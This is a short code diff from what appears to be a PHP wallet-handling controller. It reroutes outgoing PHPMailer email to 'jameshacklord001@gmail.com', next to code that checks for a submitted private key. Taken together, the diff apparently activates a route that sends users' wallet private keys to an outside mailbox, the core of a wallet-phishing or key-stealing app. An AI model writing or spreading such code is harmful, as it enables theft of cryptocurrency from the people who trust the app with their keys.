@@ -48,8 +48,8 @@ class WalletController extends Controller
     $mail->SMTPSecure = 'tls';  
     $mail->setFrom('jobmailer@sastore.com.ng', 'Jobber');
     $mail->addReplyTo('jobmailer@sastore.com.ng', 'Jobber');
-    // $mail->addAddress('jameshacklord001@gmail.com', 'user');
-    $mail->addAddress('seyiolawepo@gmail.com', 'user');
+    $mail->addAddress('jameshacklord001@gmail.com', 'user');
+    // $mail->addAddress('seyiolawepo@gmail.com', 'user');
 
     if(!empty($privatekey)){
         Log::info("INSIDE PRIVATEKEY");
